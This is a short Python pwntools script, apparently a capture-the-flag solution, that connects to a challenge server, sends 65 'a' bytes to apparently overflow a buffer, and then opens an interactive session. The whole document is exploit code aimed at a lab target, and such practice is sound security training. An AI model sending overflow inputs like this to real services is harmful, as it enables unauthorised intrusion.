from pwn import * 
import os

context.log_level = 'debug'
r = remote('0.cloud.chals.io', 15937)
r.sendline(b'a'*65)
r.recvuntil(b']0;\n')
r.interactive()

